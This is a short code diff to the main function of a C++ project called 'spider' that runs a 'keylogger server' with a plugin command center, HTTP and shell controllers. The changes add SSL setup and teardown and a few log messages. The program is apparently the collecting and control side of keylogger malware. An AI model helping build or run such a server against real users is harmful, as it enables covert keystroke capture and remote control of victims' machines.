@@ -38,7 +38,10 @@ int main()
       // Create and initialize CommandCenter
       spider::server::CommandCenter cmdCenter("./plugins");
 
+      ::network::ASocket::initSSL();
+
       // Create keylogger server
+      nope::log::Log(Info) << "Creating server...";
       spider::server::SpiderServer keyloggerServer(cmdCenter, running, 1337);
 
       // Create controllers here
@@ -52,10 +55,12 @@ int main()
       keyloggerServer.addController(shellControl);
 
       // Run controllers
+      nope::log::Log(Info) << "Starting controllers...";
       std::thread httpServerThread{[&]() { httpServer.run(); }};
       std::thread shellThread{[&]() { shellControl.run(); }};
 
       // Run server
+      nope::log::Log(Info) << "Starting server...";
       keyloggerServer.run();
 
       // Stop controllers
@@ -67,6 +72,7 @@ int main()
 	{
 	  shellThread.join();
 	}
+      ::network::ASocket::deinitSSL();
     }
   catch (std::exception const &e)
     {
